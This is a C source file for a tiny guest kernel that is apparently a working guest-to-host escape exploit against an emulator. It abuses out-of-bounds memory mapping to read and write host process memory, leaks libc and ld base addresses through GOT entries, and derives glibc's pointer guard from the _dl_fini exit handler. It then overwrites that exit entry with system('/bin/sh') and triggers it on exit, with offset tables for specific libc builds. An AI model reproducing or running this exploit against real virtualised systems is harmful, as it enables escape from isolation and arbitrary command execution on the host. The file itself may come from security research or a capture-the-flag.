#include <minik/atomic.h>
#include <minik/minik.h>
#include <minik/paging.h>
#include <minik/stl.h>

// from exit.h
// https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/stdlib/exit.h
enum {
  ef_free, /* `ef_free' MUST be zero!  */
  ef_us,
  ef_on,
  ef_at,
  ef_cxa
};

#define RAM_SIZE 0x400000 // TODO: make it work with smaller RAM size.
#define ELF_MAGIC 0x3010102464c457f
#define SHT_NOTE 0x7
#define NT_GNU_BUILD_ID 0x3

typedef struct {
  u64 build_id_start;      // first 8bytes of build_id as LE 64bit integer
  u64 base_to_data_offset; // offset from libc_base -> libc data offset
  u64 calloc_got_offset;   // offset from libc data segment -> calloc@got entry
  u64 calloc_offset;       // offset from libc_base -> calloc func
  u64 ld_base_dl_fini_offset;         // offset from ld_base -> _dl_fini func
  u64 system_offset;                  // offset from libc_base -> system func
  u64 bin_sh_str_offset;              // offset from libc_base -> /bin/sh string
  u64 dl_allocate_tls_got_offset;     // offset from libc data segment ->
                                      // _dl_allocate_tls@got entry
  u64 ld_base_dl_allocate_tls_offset; // offset from ld_base -> _dl_allocate_tls
                                      // func
  u64 initial_var_offset;             // offset from libc_base -> initial var
} LibcVersion;

static LibcVersion libc_versions[] = {
    {
        // docker
        // full hash is 58254ca972028402bc40624f81388d85ec95f70d
        .build_id_start = 0x02840272a94c2558,
        .base_to_data_offset = 0x1d2000,
        .calloc_got_offset = 0x38,
        .calloc_offset = 0x99610,
        .ld_base_dl_fini_offset = 0x4680,
        .system_offset = 0x4c490,
        .bin_sh_str_offset = 0x196031,
        .dl_allocate_tls_got_offset = 0x150,
        .ld_base_dl_allocate_tls_offset = 0x11650,
        .initial_var_offset = 0x1d42e0,
    },
    {
        // host
        // full hash is 490fef8403240c91833978d494d39e537409b92e
        .build_id_start = 0x910c240384ef0f49,
        .base_to_data_offset = 0x21a000,
        .calloc_got_offset = 0x50,
        .calloc_offset = 0xa6520,
        .ld_base_dl_fini_offset = 0x6040,
        .system_offset = 0x50d70,
        .bin_sh_str_offset = 0x1d8678,
        .dl_allocate_tls_got_offset = 0x170,
        .ld_base_dl_allocate_tls_offset = 0x147a0,
        .initial_var_offset = 0x21bf00,
    },
    {
        // host
        // full hash is cd410b710f0f094c6832edd95931006d883af48e
        .build_id_start = 0x4c090f0f710b41cd,
        .base_to_data_offset = 0x21a000,
        .calloc_got_offset = 0x50,
        .calloc_offset = 0xa6520,
        .ld_base_dl_fini_offset = 0x6040,
        .system_offset = 0x50d70,
        .bin_sh_str_offset = 0x1d8678,
        .dl_allocate_tls_got_offset = 0x170,
        .ld_base_dl_allocate_tls_offset = 0x147a0,
        .initial_var_offset = 0x21bf00,
    },

    // end marker
    {
        .build_id_start = 0x0,
    }};

inline u64 ror64(u64 value, u8 bit_count) {
  return (value >> bit_count) | (value << (64 - bit_count));
}
inline u64 rol64(u64 value, u8 bit_count) {
  return (value << bit_count) | (value >> (64 - bit_count));
}

//#define INT3() __asm__ ("int3")
#define INT3()

u8 leak[PAGE_SIZE] __attribute__((__aligned__(PAGE_SIZE)));

/**
 * NOTE: we thourougly make use of the concept of an "offset".
 * "offset": absolute offset in bytes starting from the end of our RAM buffer to
 * target address "relative_offset": offset within the currently "leaked" page.
 * must be 0 <= relative_offset < PAGE_SIZE
 */

inline void make_page_at_offset_visible(u64 offset) {
  u64 extended_offset = RAM_SIZE + offset;
  remap_va_to_page_frame(leak, extended_offset >> 12);
}
u64 read_at_offset_within_page(u64 relative_offset) {
  assert(relative_offset < PAGE_SIZE &&
         "relative_offset must be less than PAGE_SIZE.");
  return atomic_read64(leak + relative_offset);
}
void write_at_offset_within_page(u64 relative_offset, u64 value) {
  assert(relative_offset < PAGE_SIZE &&
         "relative_offset must be less than PAGE_SIZE.");
  return atomic_write64(leak + relative_offset, value);
}
u64 read_at_offset(u64 offset) {
  make_page_at_offset_visible(offset);
  return read_at_offset_within_page(offset & PAGE_OFFSET_MASK);
}
void write_at_offset(u64 offset, u64 value) {
  make_page_at_offset_visible(offset);
  return write_at_offset_within_page(offset & PAGE_OFFSET_MASK, value);
}

// Entry Point:
void _start() {
  minik_init();
  minik_write_str("[*] Kernel initialized\n");

  // ===============================================================
  minik_write_str("[*] Finding libc...");
  // find libc
  u64 val = 0x0;
  u64 offset = 0x210000;
  u64 libc_base_offset = 0x0;
  LibcVersion *libc_version = 0x0;
  u64 consecutive_zeroes = 0;
  // first go backward until first elf or guard-page
  for (; offset >= 0; offset -= PAGE_SIZE) {
    minik_writec('.');
    val = read_at_offset(offset);
    if (val == ELF_MAGIC)
      break;
    if (val == 0 && ++consecutive_zeroes == 20) // TODO: identify guard page
      break;
    if (val != 0)
      consecutive_zeroes = 0;
  }

  minik_write_str("\n[*] Found an elf page at offset 0x");
  minik_write_ull(offset, 16);
  minik_write_str(". Now searching for libc elf...");

  INT3();

  // now go forward and find libc elf
  for (;; offset += PAGE_SIZE) {
    minik_writec('.');
    val = read_at_offset(offset);
    if (val == ELF_MAGIC) {
      // offset is now the elf base and leak is elf-base aligned
      // parse elf and see if it's libc
      for (u64 i = 0; i < 0x500; i += 8) {
        val = read_at_offset(offset + i);
        libc_version = libc_versions;
        for (; libc_version->build_id_start != 0; ++libc_version) {
          if (val == libc_version->build_id_start) {
            libc_base_offset = offset;
            INT3();
            goto exploit;
          }
        }
      }
    }
  }

  // We did not find libc base :(
  minik_write_str("\n[-] Could not find libc base :(\n");
  minik_exit();

  // ===============================================================
exploit:
  minik_write_str("\n[+] Found libc elf at offset 0x");
  minik_write_ull(libc_base_offset, 16);
  minik_write_str("!\n");

  // index into first libc data segment page
  offset = libc_base_offset + libc_version->base_to_data_offset;

  // read dl_allocate_tls address from libc GOT
  u64 dl_allocate_tls_addr =
      read_at_offset(offset + libc_version->dl_allocate_tls_got_offset);
  u64 ld_base =
      dl_allocate_tls_addr - libc_version->ld_base_dl_allocate_tls_offset;
  minik_write_str("[+] Got ld_base @ 0x");
  minik_write_ull(ld_base, 16);
  minik_write_str("\n");
  // read calloc address from libc GOT
  u64 calloc_addr = read_at_offset(offset + libc_version->calloc_got_offset);
  u64 libc_base = calloc_addr - libc_version->calloc_offset;
  minik_write_str("[+] Got libc_base @ 0x");
  minik_write_ull(libc_base, 16);
  minik_write_str("\n");

  u64 dl_fini_addr = ld_base + libc_version->ld_base_dl_fini_offset;
  u64 system_addr = libc_base + libc_version->system_offset;
  u64 bin_sh_str_addr = libc_base + libc_version->bin_sh_str_offset;
  minik_write_str("[+] Got dl_fini addr @ 0x");
  minik_write_ull(dl_fini_addr, 16);
  minik_write_str("\n");
  minik_write_str("[+] Got system addr @ 0x");
  minik_write_ull(system_addr, 16);
  minik_write_str("\n");
  minik_write_str("[+] Got /bin/sh string addr @ 0x");
  minik_write_ull(bin_sh_str_addr, 16);
  minik_write_str("\n");

  u64 pointer_guard = 0x0;

  offset = libc_base_offset + libc_version->initial_var_offset;

  // read exit_function_list header
  u64 lp_next = read_at_offset(offset);
  u64 lp_idx = read_at_offset(offset + 0x8);
  // initial list has next == 0x0 and idx>0
  if (lp_next != 0 || lp_idx == 0) {
    minik_write_str(
        "[-] exit_function_list->next != 0 || exit_function_list->idx == 0\n");
    minik_exit();
  }
  // advance offset to exit_function_list.fns[] array
  offset += 0x10;

  minik_write_str(
      "[*] Searching for _dl_fini entry in initial exit_function_list...");
  // iterate lp and find _dl_fini entry
  for (u64 i = 0; i <= lp_idx; ++i) {
    minik_writec('.');

    // read exit_function entry, one-by-one because of possible page overlapping
    // entry.
    u64 flavor = read_at_offset(offset);
    offset += 8;

    u64 fn = read_at_offset(offset);
    offset += 8;

    u64 arg = read_at_offset(offset);
    offset += 8;

    u64 dso_handle = read_at_offset(offset);
    offset += 8;

    if (flavor == ef_cxa && arg == 0 && dso_handle == 0 && fn != 0) {
      // we found _dl_fini entry
      minik_write_str("\n[+] Found _dl_fini entry at index ");
      minik_write_ull(i, 10);
      minik_write_str("\n");
      pointer_guard = ror64(fn, 0x11) ^ dl_fini_addr;
      INT3();
      break;
    }
  }

  // We didn't found _dl_fini entry :(
  if (pointer_guard == 0x0) {
    minik_write_str("\n[-] Could not find _dl_fini entry :(\n");
    minik_exit();
  }

  minik_write_str("[+] Got pointer_guard: 0x");
  minik_write_ull(pointer_guard, 16);
  minik_write_str("\n");
  u64 system_addr_mangled = rol64(system_addr ^ pointer_guard, 0x11);
  minik_write_str("[*] PTR_MANGLED(system): 0x");
  minik_write_ull(system_addr_mangled, 16);
  minik_write_str("\n");

  minik_write_str("[*] Overwriting _dl_fini entry with system('/bin/sh')...");
  // reset offste to start of _dl_fini entry
  offset -= 0x20;
  // flavor
  write_at_offset(offset, ef_cxa);
  offset += 8;
  minik_writec('.');
  // fn
  write_at_offset(offset, system_addr_mangled);
  offset += 8;
  minik_writec('.');
  // arg
  write_at_offset(offset, bin_sh_str_addr);
  offset += 8;
  minik_writec('.');
  // dso_handle
  write_at_offset(offset, 0x0);
  offset += 8;
  minik_writec('.');
  minik_write_str(" - Done!\n");

  // ===============================================================

  minik_write_str("[*] Exiting emulator and trigger the exploit... enjoy :)\n");
  INT3();
  // Clear Interrupts so that we don't get the vt100 interrupts
  CLI();
  // Trigger exit() call and with it our faked __exit_funcs entry
  minik_exit();
}